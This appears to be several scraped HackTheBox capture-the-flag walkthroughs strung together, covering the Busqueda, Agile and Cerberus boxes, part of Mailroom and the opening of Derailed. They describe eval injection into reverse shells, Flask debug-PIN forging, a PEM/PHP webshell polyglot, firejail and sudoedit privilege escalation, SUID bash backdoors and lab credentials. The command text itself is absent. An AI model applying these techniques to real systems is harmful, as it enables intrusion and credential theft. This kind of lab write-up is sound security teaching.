/proc is mounted with hidepid=2, which confirms that:
Still, some of the time there is a process owned by matthew that is running kpcli (which is a perl script):
The box is also set up such that the ptrace scope is the most open:
0 means that “all processes can be debugged, as long as they have same uid”.
LinPeas will alert on this (seen in the source here on lines 82-84). LinPeas warns against abuse of sudo tokens, but I’ll abuse it differently for Mailroom.
The system is configured such that I can debug processes owned by matthew. I also see something is starting kpcli as matthew regularly. It seem the process is actually running perl (based on the ps output above). I can get the current pid with pidof:
I can try to attach strace passing in -p $(pidof perl) to get the process. If there’s no perl process, it fails:
If I am able to attach, it’s very loud:
To get a clean look, I’ll use a while loop to wait for the process to exist. I’ll wait until there is no perl process, and then start this:
Interestingly, it always dies quickly after only one line:
I’ll look at why this is happening in Beyond Root. Immediately after connecting the trace, I get that trap message and it ends. I’ll get around that by tracing again:
out2 has lots of data:
strace output looks like:
The various system calls are shown with their arguments and return values. I can use some Bash foo to look at the number of times each system call is made:
A good place to start is with read and write. For a program like kpcli, that will capture the stuff written to the terminal (write) and the stuff read from STDIN (read). On a quick look, there’s a bunch of EAGAIN messages that I don’t think I need, so I’ll grep those out as well:
It starts by reading open /home/matthew/personal.kdbx, and then it asks for the password to the database and reads it in:
After reading it, it decompresses it! The characters typed are !sEcUr3p4$$w01\10rd9. It’s important to notes that “\10” is octal for 8 which is the ASCII backspace! So the password is !sEcUr3p4$$w0rd9.
The password works to access the KeePass DB:
There’s one group named Root:
It has five passwords:
“root acc” sounds interesting:
That password works to get to the root account using su:
And read the root flag:
I wanted to take a look at the automation scripts and what was causing me to get dropped from tracing with my loop. I’ll walk through that in this quick video:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 08 Apr 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 22.04 jammy.
The HTTP response shows a redirect to http://searcher.htb. Given the use of DNS / domain names, I’ll fuzz the server with wfuzz to look for subdomains that respond differently, but not find anything. I’ll add searcher.htb to my /etc/hosts file:
The site is a unified search engine that generates query URLs for a ton of different search engines:
If I select GitHub and search for “0xdf”, it goes to /search which returns this URL:
If I do the same search with “Auto redirect” checked, it redirects to that page:
The HTTP response headers show this is a Python application:
Werkzeug is most commonly seem in Flask applications. The 404 page for this application is the default Flask 404:
It also says this is Flask at the bottom of the page:
Searchor is a Python package and command line tool that allows for easily searching and web scraping, which is clearly what’s being used to generate the URLs.
I’ll run feroxbuster against the site, and it finds only the /search path that I already know about:
/server-status is a standard Apache thing.

Category: Shell as svc
On the Searchor releases page, Searchor v2.4.2 says that it patches a priority vulnerability in Searcher CLI:
The link leads to this pull request, which says:
The simple change in this pull request replaces the execution of search method in the cli code from using eval to calling search on the specified engine by passing engine as an attribute of Engine class. Because enum in Python is a set of members, each being a key-value pair, the syntax for getting members is the same as passing a dictionary.
This pull request removes the use of eval in the cli code, achieving the same functionality while removing vulnerability of allowing execution of arbitrary code.
The “Files changed” tab shows that it’s only a small change in one file:
The use of click makes sense since the vulnerability is in the command line application, and click is a Python library for making command line applications.
This seems like it would be a trivial injection at this point, but getting it working is tricky. Part of that is because it doesn’t make a lot of sense that the box would be using the Searchor CLI when it is a Python web application, and could just use the library to generate these URLs.
That said, if Busqueda is vulnerable to this bug, then it must be in the CLI. I’ll install the CLI, but first make a Python virtual environment:
The first line creates the environment, and the second activates it, setting paths and environment variables such that when I try to run things like Python or install packages, they go into that virtual env. This allows me to work in a clean Python environment, and to mess with the files without impacting my host configuration. Then when I’m done with it, I’ll just rm -rf venv and it’s all gone.
I’ll install this version of Searchor into the venv:
Now if I look for the path to searchor, it’s in the venv folder:
Running searchor shows it has two commands, history and search:
The pull request showed the change was in the search command. --help shows the syntax:
I’m trying to inject into this code, where I control engine and query:
If I target engine, it’s likely to error out, and I won’t get a result back, so I’ll focus on query. If I give it a single quote, it crashes:
I need to make that syntax correct. A bit of trial and error gets me to something like:
If I submit that as the search, that the code will look like:
It works:
The result is URL-encoded, but decoding that gives, which is the output of the id command:
I’ll try submitting that payload by finding the POST request in Burp Proxy, and sending that request to Burp Repeater. There, I’ll edit the query to be my parameter:
Once it’s there, I’ll want to URL encode it by selecting everything between my ' and pushing Ctrl-u. Clicking “Send” shows success:
If I select the response and push Ctrl-Shift-u, the URL decoded text pops up:
Still in Repeater, I’ll replace id with a bash reverse shell:
I’ll need to select the new stuff and Ctrl-u to URL encode it:
It is important to be careful about what is getting URL encoded. + becomes %2b, but space becomes +. It’s important that every be encoded only once.
I’ll start nc listening on 443 and send the request:
I’ll do the standard shell upgrade:
And grab user.txt from svc’s home directory:

Category: Shell as root
svc is the only user with a home directory in /home. The directory is pretty empty, but the .gitconfig file is interesting:
The svc user’s name is cody.
The web code is located in /var/www/app:
The .git folder suggests this application is managed via Git. The config is interesting:
There’s a reference to gitea.searcher.htb, and creds for the cody user.
I’ll update my /etc/hosts file and check out gitea.searcher.htb:
It is a Gitea instance, and cody’s creds work:
The code for the site is here, but nothing too interesting.
Running sudo requests a password:
Knowing that svc is cody, I’ll try cody’s Gitea password, and it works:
The permissions on this file are such that svc can’t read it, and can’t even execute it (in order to execute a script with an interpreter like Python, it must have read; an ELF binary would work fine this way):
Because of the * at the end of the sudo line, I can’t run it without args:
I’ll try with “0xdf” on the end:
There are three functions. docker-ps prints the output of what looks like the docker ps command:
There are two containers running.
docker-inspect wants a format and a container name:
The docker inspect command takes a container and the docs show a --format option. This allows for selecting parts of the result. This page of docs shows how the format works. If I pass it {{ json [selector]}} then whatever I give in selector will pick what displays. If I just give it . as the selector, it displays everything, which I’ll pipe into jq to pretty print:
The environment section has the connection info for the DB, and there’s a password.
The last option is full-checkup, but it just errors:
I’ll get the IP of the database by running the system-checkup.py script on the mysql_db container:
I’ll connect to the DB:
gitea is the only interesting db:
I’ll check out the user table:
I’ve already got cody’s password. Before I try to crack the administrator’s password, I’ll see if it is reused from the database? Trying to log in with administrator / “yuiu1hoiu4i5ho1uh” works!
Administrator has one private repo named “scripts”:
system-checkup.py is in that repo:
The script is relatively simple. It has three sections, one of which gets called based on the command given. There is a run_command function that uses subprocess.run to run system commands in a safe way. This is not command injectable.
docker-ps and docker-inspect both use run_command to run docker ps and docker inspect just like I would have guessed.
full-checkup is where it is interesting:
It is trying to run full-checkup.sh from the current directory. It failed before because that file didn’t exist.
I can put whatever I want into a full-checkup.sh and it will run as root if I start system-checkup.py full-checkup in the same directory.
I’ll have it copy bash and set my copy as SetUID to run as root:
It’s important to set it as executable as well.
I’ll run system-checkup.py and it reports success:
/tmp/0xdf is there, owned by root, and the s bit is on:
I’ll run with -p to not drop privs:
And grab root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 04 Mar 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.094s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
The website is redirecting to superpass.htb.
I’ll use wfuzz  or ffuf to fuzz for other subdomains, but not find any. I’ll add superpass.htb to my /etc/hosts file.
The site is a password manager:
I’ll create an account and now I’m redirected to /vault:
Clicking “Add a password” opens a form with the password already filled in:
Completing the rest of it and clicking the save / disk icon makes it no longer editable:
Pushing the export button will download a CSV:
The HTTP response headers show NGINX, but nothing else:
Guessing at extensions doesn’t return anything. The 404 page matches the default 404 for Flask:
This suggests the site is Python Flask.
I’ll run feroxbuster against the site, but it doesn’t find anything I haven’t seen:

Category: Shell as www-data
Looking in Burp, I’ll see that when I click on Export, there’s a GET request to /vault/export, which returns a 302 to /download?fn=[username]_export_[some hex].csv. Neither of these ever show up in the browser address bar, because the end result is a file that’s downloaded.
There’s two vulnerabilities to identify in /download. The first is a directory traversal / file read vulnerability:
The second is that if the file path isn’t good, the page crashes revealing that the server is running Flask in debug mode:
The debug page for Flask is made for developers to find a crash and figure out what happened. It gives not only the stack trace, but also the ability to get a Python console and run additional commands at the point of the crash. If I move my mouse over one of the outputs, the little terminal logo appears:
Clicking on the terminal pops a message asking for the PIN:
This is a safety mechanism that wasn’t present in early versions of the debug page (added in version 0.11, released Nov 2015). This pin is printed to the terminal when the Flask site is run. If I have the pin, I can get execution on the system. To calculate the pin, I’ll need to collect a handful of strings from the system, using the file read vulnerability.
HackTricks has a writeup on generating the pin, showing how it is generated in the Flask (specifically in the werkzeug module) source, and providing a script. I’ll grab a copy of that script, and I’ll need to update several things. I’ve shown this before as an unintended method on OpenSource.
The big trick on Agile is that most the guides (including the HackTricks and my post) make assumptions about one of the items you need, and that assumption is not always correct. I’ll start following the guides, fail, and then show how to fix it.
The first part of the script that requires updating is the list named probably_public_bits.
To get the username, I’ll check /proc/self/environ using the file read vuln:
The server is running as www-data.
In previous guides, the second item is always given as “flask.app” and the third as “Flask”. We’ll come back to these.
The fourth item is the full path to the application, which is in the crashdump:
My script looks like:
The next section is the list private_bits:
I’m going to switch to curl here for ease. I’ll need to use --path-as-is so that curl doesn’t undo the ../, and I’ll need the cookie, which I’ll save in an env variable. I’ll need to get the MAC address. I can find that at /sys/class/net/[device]/address. To get the device name, I’ll pull /proc/net/arp:
The device is eth0, which I’ll use to get the MAC:
The script needs this as an int, which I can use Python to convert:
The next item is a combination of a couple files. First, I need /etc/machine-id:
I’ll also need the first line of /proc/self/cgroup, from the last “/” to the end:
I only need the “superpass.service” part.
Putting that all together updates the script to:
I’ll run this and it outputs a pin:
But it doesn’t work:
One possible issue has to do with the hash algorithm in use. Werkzurg updated their code from MD5 to SHA1 a while ago. At the time of Agile’s release, there was a note on the Hacktricks page:
If you are on a new version of Werkzeug, try changing the hashing algorithm to sha1 instead of md5.
By the time Agile is retiring, the script is just updated to use SHA1. To verify this, I’ll pull the file from Agile and confirm it’s using SHA1 (not MD5):
I’ll make sure my script is not using MD5, and if it is, fix it:
Now on running this generates a new pin:
But it still doesn’t work.
Guides show the third item in probably_public_bits typically as just “Flask”, but that isn’t always the case. It has to do with how Flask is launched on the host.
I’ll demonstrate that in this video where I make a HelloWorld Flask application and show how the variables change.
Side note: I’m still very interested in why Ubuntu Desktop doesn’t return “correct” values for getnode. If you have any idea, please reach out to me on Twitter or Discord).
In this next video, I’ll collect the correct data for Agile to get the pin:
I’ll see how the application is running, recreate a version of it on my machine. In that version, I’ll update the Werkzeug package to print the things that go into the pin when it’s created, and show that it actually prints three times:
With some playing around, I’ll see that what I need is “wsgi_app”, which comes from the fact that this is served using Gunicorn.
I’ll update and get a new pin, and it works:
It looks like the os module is imported already:
I’ll use Python #2 from revshells.com, pasting it directly into the console:
The page hangs, but I get a shell:

Category: Shell as corum
The shell will only last about 5 minutes based on the connection, so it’s important to work quick (or just get another shell). With access as www-data, I can read the DB connection string from /app/config_prod.json:
I’ll use that to connect to the database and dump the passwords:
There’s a password for “agile” for the corum user. It works over ssh:

Category: Shell as edwards
There’s a parallel testing/dev instance of the site in /app:
As corum, I’m able to access everything in app. I can read almost everything in app-testing as well.
The  test_and_update.sh script is also readable:
It checks if pytest is already running, and if so, exits. Then it goes into the app-testing folder, sources the local env that’s shared between the apps, and calls pytest. If it succeeds, it copies the superpass folder into /app/app (if it passes tests, deploy!).
There’s one file of tests in app-testing:
corum can’t read creds.txt. It’s used in test_site_interactively to log into the page on test.superpass.htb:
It’s using Selenium with headless Chrome to load the site:
The remote debug port is fixed on 41829.
The test.superpass.htb site is defined in cat superpass-test.nginx:
It’s only listening on localhost, and it’s proxying everything to localhost 5555. If I try to update my hosts file to include this domain and access it directly, it just redirects to superpass.htb. That’s because I’m not coming from localhost. The easiest way to access it is just to tunnel directly to TCP 5555 on Agile, so I’ll do that by reconnecting my SSH as corum with -L 5555:localhost:5555.
The page looks exactly the same, but there are a few differences:
Because the tests take a long time, this means the chrome debug port will almost always be up.
I’ll use SSH to tunnel 41829 on my host to 41829 on Agile.
I’ll open Chromium and go to chrome://inspect and go to the devices page:
I’ll add the port under Configure:
And clicking done shows a new remote target:
Clicking on “inspect” pops a dev tools instance connected to the testing selenium:
If I watch long enough or catch on at the right time, I can get a view of edwards’ vault. A more reliable way is to go to the application tab where I can get the cookies in use:
I can tunnel to port 5555, and add these cookies to my browser to get access to a new vault:
There’s another password for “agile”, for the edwards user.

Category: Shell as root
root is periodically logging in, and each time it will source /app/venv/bin/activate. If I can edit that, I can get execution as root. This file is writable by root and dev_admin:
I’ll abuse CVE-2023-22809 to write this file as dev_admin:
In the file, I’ll add code to create a SUID bash:
After the next minute, the backdoor is now in /tmp, and gives a shell:
Agile was patched after it’s week in the season scoring to fix two vulnerabilities:
I’ll look at each here.
There was an insecure direct object reference vulnerability in the get_password_by_id function. This allowed users to find the /vault/row/<id> endpoint and request passwords from other users, leaking corum’s password, skipping the Flask debug step.
The route used a function in /app/app/superpass/services/password_service.py called get_password_by_id.
The code on release day was this:
On first look, it looks like the app is checking for passwords that match the given ID and the current user’s ID. Unfortunately for me, that is a copy and paste typo, as the last check is comparing User.id and userid. The function is called with the current user’s ID, which is userid. User is from the data models. The problem is that a Password object doesn’t have a User, so it makes no sense here, and just silently does nothing. This was patched by changing the query to:
The first step of the box is to use Flask debug to get onto the host and get database access to get corum’s password. This could be bypassed by reading the source code for the application. On initial release, it has a static SECRET_KEY value set at the top of the file:
With access to this key, it is easy to forge a Flask cookie for any user (like in Rainyday or Noter). Reading the /etc/passwd file will give usernames to try, and then logged in as corum, it’s as simple as SSHing into Agile.
This was patched by setting this to a random 32 characters on each application startup:
This strategy has drawbacks - if the application restarts, then all existing cookies become invalid. That might bring real issues in the real world, but it works perfectly well for a HTB machine.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 18 Mar 2023
OS : Windows
Base Points : Hard [40]
Creators : TheCyberGeekTRX
Nmap scan:
Host is up (0.088s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxyCategory: Recon
nmap finds a single open TCP port, HTTP on (8080):
The webserver is returning a redirect to http://icinga.cerberus.local:8080/icingaweb2. I’ll note the domain, and get more into the Icingaweb software when I enumerate the webserver.
There are three UDP ports in the top 1000 that look open to nmap:
Having NTP available is good to know if I need to do anything with Kerberos.
Based on the Apache version, the host is likely running Ubuntu 22.04 jammy. This is interesting, as HackTheBox advertises this as a Windows machine.
I can test this by looking at the time to live (TTL) on the ICMP packets that come back when I ping the host:
The default TTL on windows is 128, which gets decremented by one at the router between my host and the box to 127. On the other hand the default for Linux is typically 64, so I would expect to see 63 for a Linux host. This implies the webserver is in some kind of Ubuntu VM or container running on a Windows host.
I can also look at the TTL in the TCP packets when I request the page on 8080 in Wireshark. Here is a 200 OK response for the webserver:
The TTL of 62 suggests it started as 64 (Linux), was decremented at the host, and then again at the router between my VM and the host.
I’ll use dig to try to query Cerberus for some DNS mappings. Trying to get cerberus.htb times out:
However, trying to get cerberus.local (from the redirect on TCP 8080) works immediately:
I suspect the DNS server doesn’t know cerberus.htb, so it is trying to query an upstream server, and likely failing to get out to the internet.
The fact that cerberus.local points to both the expected IP and 172.16.22.1 is interesting. The .1 is likely still the host machine, but it makes sense that the VM or container would be able to get access to the machine by hostname from within the 172.16 network.
Reverse lookups must be disabled, as giving IPs in 172.16.22.0/24 with the -x flag timeout as well.
The icinga domain returns a couple other hostnames:
I’ll add all of these to my local hosts file.
I suspect that LDAP is active on the host on TCP as well, but I can’t access it because of a firewall. Unfortunately for me, LDAP over UDP is very limited:
Active Directory supports search over UDP only for searches against rootDSE.
The Microsoft glossery defines the rootDSE as:
root directory system agent-specific entry (rootDSE): The logical root of a directory server, whose distinguished name (DN) is the empty string. In the Lightweight Directory Access Protocol (LDAP), the rootDSE is a nameless entry (a DN with an empty string) containing the configuration status of the server. Access to this entry is typically available to unauthenticated clients. The rootDSE contains attributes that represent the features, capabilities, and extensions provided by the particular server.
Basically I could only get information about available auth methods.
Given the use of domains, I’ll check to see if there are any other subdomains that return anything over HTTP other than a redirect to icinga.cerberus.local. I’ll use the -fr flag to filter out anything with icinga in the response. It finds nothing else:
I’ll add what I’ve got to my /etc/hosts file:
The site is a Icinga login page:
The social media logos got to the real company’s pages. Icinga is a “resilient, open source monitoring and metric solution system.”
The source for IcingaWeb2 shows it’s a PHP based site:
Visiting / enters a redirect chain of to /icingaweb2 -> /icingaweb2/ -> /icingaweb2/authentication/login -> /icingaweb2/authentication/login?_checkCookie=1 -> /icingaweb2/authentication/login. The final response sets a cookie that looks like a standard PHP session cookie:
The 404 page is a custom page by icinga:
I can’t find anything easy information that leaks the version of icinga running here.
Poking at bit more at the version, I’ll clone the repo to my system. I want to look for files that I can directly access without change that are updated a lot. The public directory seems like a good place to start. I’ll make this bash onliner to get the number of commits for each file:
This command breaks down as:
I’ll start with loader.js. I’ll create a file to map each commit to the MD5 of loader.js using another bash loop:
This command breaks down as:
This takes a minute to run, but once I’m done, I’ll get the MD5 of the file on Cerberus:
I’ll get the MD5 of the file on Cerberus:
And look for that in the hashes file I just created:
I’ll run git log public/js/icinga/loader.js and look for that hash:
This result tells me this version of IcingaWeb2 was released sometime between 7 July and 7 October 2021.
Looking at the releases page on the IcingaWEb2 GitHub, there’s the release of 2.9.0 on 12 July 2021:
There’s also in 2021:
That means this must be somewhere between 2.9.1 and 2.9.3.
Looking through the other files on the list, the widgets.less file has commits on 6 July, 2 August, and 17 September, which makes it a great candidate to differentiate here. I’ll do the same thing. I’ll run git checkout master to get back to a clean state, and then run the loop again making a map of commits to hashes:
Now I find the hash on Cerberus and get the match:
That’s the 6 July commit:
So this has to be 2.9.0, 2.9.1, or 2.9.2. I could look for other files that might narrow it further, but this is good enough to start getting a feel for what to look for.

Category: Shell as www-data on icinga
An internet search for “icinga exploit” finds articles talking about vulnerabilities from spring 2022:
The top link from SonarSource talks about two vulnerabilities. These vulnerabilities are visible as fixed in the 2.9.6 release in March 2022:
I’ll come back to the second (CVE-2022-24715 which gives RCE but is also authenticated). The first is CVE-2022-24716, an arbitrary file disclosure vulnerability (not an LFI, as the file is not “included” or executed, just returned).
The details of CVE-2022-24716 are in the post. The short version is that the user can specify an empty “asset path” to StaticController.php, which allows for a path to be constructed using only user input. That means that /icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts will return the contents of the /etc/hosts file:
There is a matthew user in the /etc/passwd file, but I am not able to read anything out of /home/matthew.
Searching for “icingaweb2 config files” finds this page of the Icingaweb2 docs on configuration. At the top, it summarizes the files stored in /etc/icingaweb2:
roles.ini shows that the matthew user is an administrator, and resources.ini gives a password for connecting to a MySQL database as matthew:
The combination of the username matthew and the password “IcingaWebPassword2023” works to log into the site:
The other vulnerability in the SonarSource post is CVE-2022-24715, which they label as RCE, but it’s really an arbitrary file write vulnerability that can be used to get RCE. The issues is in the SshResourceForm.php file:
The file path that’s written is assembled with $user as the end of it, and that value is just passed in from the form. There’s no sanitization, and it even allows for ../ in the username.
To get to the vulnerable form, I’ll visit Configuration > Application > Resources, and click the “Create a New Resource” button:
When the “New Resource” form pops up, I’ll change the resource type to “SSH Identity”:
I’ll try to set the “User” to write to /dev/shm/0xdf.txt:
It complains the the SSH key is invalid:
If I generate an SSH key with ssh-keygen and try to upload it, the same message comes back. I’ll download a vulnerable version of the source from GitHub, and take a look. The file they call out in the blog post, SshResourceForm.php also has the validation for the input:
If the input starts with file:// or doesn’t pass openssl_pkey_get_private, it fails validation. openssl_pkey_get_private is a PHP function, and the input, according to the docs, is:
private_key can be one of the following:
So this check only wants to be successful if the second of the two options is true.
I’ll use ssh-keygen to make a key, giving it -t rsa to get the RSA key type, -f dummy_key to name it that in the current directory, -m pem to make it the PEM format that PHP is looking for.
I’ll grab the resulting private key and put it into the form:
When I “Save Changes”, it reports success. Even better, when I check with the file read, the file is there in /dev/shm/0xdf.txt:
At this point I can only write a PEM formatted key. However, as this article points out:
A PEM encoded file includes Base64 data. The private key is prefixed with a “—–BEGIN PRIVATE KEY—–” line and postfixed with an “—–END PRIVATE KEY—–”. Certificates are prefixed with a “—–BEGIN CERTIFICATE—–” line and postfixed with an “—–END CERTIFICATE—–” line. Text outside the prefix and postfix lines is ignored and can be used for metadata.
That last line is awesome. I can put whatever I want before and after the begin / end lines. I’ll write a PHP webshell using multiline PHP comments to create this polyglot that is both a valid PEM key and a functional PHP file:
It writes:
The question now is how to leverage this file read and file write to get execution on Cerberus.
The obvious idea is to write a PHP webshell into the web root and access the file directly through there. To do that, I’ll need to located it, and it’ll have to be writable. I am able to find index.php in /var/www/html that does the redirect to Icinga:
I’ll try to write there, but the form submission returns an error:
This error shows that the current user can’t write to that folder. It does leak the path to the Icinga instance in /usr/share. I can try to write in there, but that entire file tree is not writable as well.
This is called out as the default behavior in the blog post:
When installed using the official Linux packages, the PHP scripts of Icinga Web 2 are deployed under /usr/share/icingaweb2. They are owned by the root user and hence can’t be modified with the identity of www-data under which the HTTP server is running.
The blog post has a section at the end that talks about how to deal with the un-writeable web directories:
While this would prevent straightforward exploitation based on planting a PHP file under this directory and accessing them, we found another technique that attackers could use to obtain the execution of arbitrary code.
Icinga has a notion of modules, self-contained third-party code that extends the interface’s capabilities (e.g., to add Grafana support). These modules are stored under /usr/share/icingaweb2/modules by default, but administrators can also change this path directly from the interface.
The setting global_module_path expects colon-separated paths from where modules are located. Changing this value to a path where the previously demonstrated vulnerability can write, say /dev/shm/, setting  global_module_path to /dev/, and enabling the new module named shm allows executing arbitrary PHP code.
Under Configuration > Application > General there’s a line to set the “Module Path”:
If I change the path to /dev, it reports success:
This does work, though it also seems like there’s a cron on Cerberus setting it back periodically.
This post by Icinga provides resources for creating a module, including their class and some examples.
The module has a large format:
I don’t need most of that. configuration.php seems like a good choice to work with, as it will have to be loaded either first or towards the beginning.
It takes a bit of playing around with the file to get it to work, but eventually I got this:
When I upload this to /dev/shm/configuration.php, and then (after making sure the module path is still /dev) visit the modules page, I’ll find shm there. Clicking on it shows the status, and at the bottom there’s the output of a ping:
And at tcpdump on my machine:
I’ll replace the ping with a command to get a reverse shell:
I’ll write shell to be a simple Bash reverse shell:
Now I’ll trigger the module, and I get a shell:
I’ll do the standard shell upgrade:

Category: Shell as root on icinga
It’s very clear that I’m in a container or VM. The IP address is 172.16.22.2, which is not what I connected to. And it’s Linux and not Windows.
The container is relatively empty, other than the Icinga install. I can’t run sudo, and there’s nothing obvious to work with or any obvious attack surface. Given that this is supposed to be a Windows box I must be in either a container or a VM. I don’t see any of the obvious signs of docker (no .dockerenv file in /, for example).
There’s a single user on the box, matthew, but I can’t access their home directory.
There is one SetUID binary that stands out as unusual, firejail:
Firejail is a security sandbox that:
reduces the risk of security breaches by restricting the running environment of untrusted applications using Linux namespaces and seccomp-bpf. It allows a process and all its descendants to have their own private view of the globally shared kernel resources, such as the network stack, process table, mount table.
Searching for “firejail exploit” returns this Openwall post that includes a Python POC. This vulnerability is tracked as CVE-2022-31214.
I’ll download the script and serve it from my VM with a Python webserver. I’ll fetch it to the icinga box with wget:
Reviewing the exploit, it needs two terminals to work. I’ll get a second one using the same foothold (and get a full PTY using the script technique), and run the exploit:
In the other terminal, I’m able to join that session, but the command it gives fails:
Luckily, just su - works:

Category: Shell as matthew on Cerberus
Other than some clean copies of config files that may get overwritten in the icinga attack, there’s nothing interesting in /root. root is running a few crons every 10 minutes, but these are related to cleaning up icinga as well:
Looking at the process list, there are a few processes involving sssd:
Those are interesting.
The IP for the box is 172.16.22.2:
As I noted above, I must be in a container or a VM. A quick ping sweep will show only one other host in the network:
.1 is likely the host.
I’ll upload a statically compiled nmap and point it at the presumed host machine:
Not much is open, but 5985 is, which is WinRM. If I can find creds, I can potentially get a shell over that.
sssd is an open source client for enterprise identity management. It allows for Linux machines to be joined into an Active Directory domain.
HackTricks has a page on Linux AD, and a section mentions SSSD:
SSSD maintains a copy of the database at the path /var/lib/sss/secrets/secrets.ldb. The corresponding key is stored as a hidden file at the path /var/lib/sss/secrets/.secrets.mkey. By default, the key is only readable if you have root permissions.
On icinga, there is a secrets.ldb file, but no secrets.mkey. l’ll look at bit at the secrets.ldb file (strings mostly), but not find much.
Stepping back, I’ll look at the sss directory:
There are a few files in the db directory. Running strings on cache_cerberus.local.ldb returns a bunch of data, including references to the matthew user and some hashes:
I’ll run the hash recovered above through rockyou.txt with hashcat:
It cracks in less then 15 seconds.
I’ll grab a copy of Chisel and upload it to icinga as well. On my VM, I’ll start the server (giving it a different port since Burp is already using 8080 on my system and using --reverse so that I can do reverse tunnels):
On icinga, I’ll run ./chisel_1.8.1_linux_amd64 client 10.10.14.6:8000 R:5985:172.16.22.1:5985 to create listener on my host on 5985 that will tunnel through the VM and then forward to the host on 5985. The server shows the connection:
I’ll use evil-winrm to connect and get a shell:
I am able to read the user flag:
For a while I was getting the following error:
This is due to the default OpenSSL configuration on my Ubuntu VM, which mikedec posted a solution for in the HTB Forums. Adding those lines in my /etc/ssl/openssl.cnf file fixes the issue.

Category: Shell as aris on Cerberus
There’s nothing else of interest in matthew’s home directory. IIS is installed, but the C:\inetpub\wwwroot directory just has the default IIS page.
Looking at the installed programs, there are a few in Program Files and Program Files (x86) that are interesting:
The ManageEngine directory has a ADSelfService Plus folder, which has the application:
Backup has a .ezip file:
If that has a backup of the active directory database, it would have passwords or hashes I could use. I’ll download a copy. I often have trouble with the download in Evil-WinRM, so I’ll just create an SMB server:
Now I’ll copy the file into it:
unzip doesn’t seem to be able to handle this kind of archive:
7z has no issue listing the files in the archive:
There are a lot of files. Given the number of files, I’ll move to a clean directory to not muck things up when it does unzip (or fail creating empty files).
Extracting needs a password:
The docs show a default password for ADSelfService Plus:
If the admin hasn’t configured it, the password is the filename backwards. They don’t include the extension in the example:
That works! There’s almost a thousand files:
There is a file called hashes.txt:
There’s a couple other bcrypt hashes in the files as well:
I’ll try to crack these with hashcat, but nothing cracks quickly.
The backup looks like a dead end for now.
Some Googling for “ADSelfService Plus exploit” will turn up this merge request for an exploit into Metasploit. It was merged on Feb 7 2023, just in time for Cerberus’ release on 18 March, and it’s in my local msfconsole now. There is also a POC from the researcher who discovered this vulnerability, but I didn’t try it.
Looking at the options is a good way to figure out what I need for this exploit:
I’ll need a SAML endpoint GUID, as well as an Issuer URL. The RPORT defaults to 9251, which is listening on Cerberus:
I’ll want to poke at ADSelfService Plus and these SAML endpoints a bit more. I’ll upload the Windows  Chisel binary (from the latest release) to Cerberus, and connect it opening a socks proxy with .\c.exe client 10.10.14.6:8000 R:socks.
I’ll use FoxyProxy to tunnel Firefox:
And proxychains for anything on the command line.
Visiting https://127.0.0.1:9251 returns a bunch of redirects that eventually end up at this monster URL:
After adding dc.cerberos.local to my /etc/hosts file, it loads:
There’s not much I can do on this site without creds.
The URL above does have useful information. The two parameters passed are SAMLRequest and RelayState. Both appear to be URL encoded base64.
If I URL decode the SAMLRequest (online tools like urldecoder.org or Burp Decoder will work), and then pass them to a SAML decoder such as this one on samltool.com, it generates XML:
The full XML is:
The merge request for the exploit talks about getting the GUID:
At this point you will need to take note of the URL (Recipient or Issuer URL they should be the same). Its format is https://<hostname>:9251/samlLogin/<32-digit id>. The ID will be used by the module (see the next section).
That ID is towards the top of this XML in the saml2p:AuthnReqeust as the AssertionConsumerServiceUrl. I’ll note the GUID as “67a8d101690402dc6a6744b8fc8a7ca1acf88b2f”.
This one isn’t clearly described in the exploit pull request. I actually stumbled across it in the offline backup from above, looking for “ISSUER”:
This file has a bunch of config things:
I’ll use “http://dc.cerberus.local/adfs/services/trust”.
I’ll use the information gathered to configure the exploit:
Running this returns a warning:
It’s warning me that while the exploit might go through the proxy, the resulting payload will not. I’ll say that’s ok, as I suspect that Cerberus can connect back to me (if it fails, I’ll explore other vectors).
Running now returns a shell as SYSTEM:
And can grab the root flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 19 Nov 2022
OS : Linux
Base Points : Insane [50]
Creators : irogirTheCyberGeek
Nmap scan:
Host is up (0.027s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  pppCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (3000):
Based on the OpenSSH version, the host is likely running Debian 11 bullseye. The HTTP title is derailed.htb, which suggests that’s the domain name for the site.
Given the reference to a domain, I’ll check for any subdomains with ffuf, but not find any.
The site is a note taking application:
Entering some data and clicking “Create New Clipnote” loads a page with a new note at /clipnotes/109, and provides what looks like an editor, but trying to type pops an error:
I’ll create an account, and I can log in, and view other user’s notes. I’m still not able to edit notes.
I’ll look for other notes. There’s one with id 1, and then the rest I created in testing:
The first note doesn’t have anything useful, but does leak a username, alice:
If these notes are meant to be private, this is an insecure direct object reference (IDOR) vulnerability. However, it’s not clear from the site if you should be able to access other another user’s notes or not.
Each note has a reporting option in the menu at the top right of the note:
Clicking leads to /report/[note id], and presents a form to say what is in appropriate about the report:
On entering some text and clicking submit, it says:
I can check for XSS. Given that the contents submitted are not displayed back to me, this would be a blind XSS, and I’ll have to try payloads that would connect back to me. I’ll submit a handful, but nothing ever connects back to my system.
The HTTP response headers show a _simple_rails_session cookie being set:
This suggests it’s a Rails application, a Ruby web framework. The client side work is using Webpack, a JavaScript framework (as can be seen in the browser dev tools):
I’ll run feroxbuster against the site:
There’s one new page of interest, /administration, that just returns a redirect back to /login. Visiting as even a logged in user returns to /login. I likely need some kind of admin account to access this.
There’s also the /rails/info/routes path that will print out all the routes for the application:
For each route, it shows the relative path on the webserver as well as the controller and function that it maps to.
feroxbuster didn’t detect it with my default wordlist because /rails returns a 404.
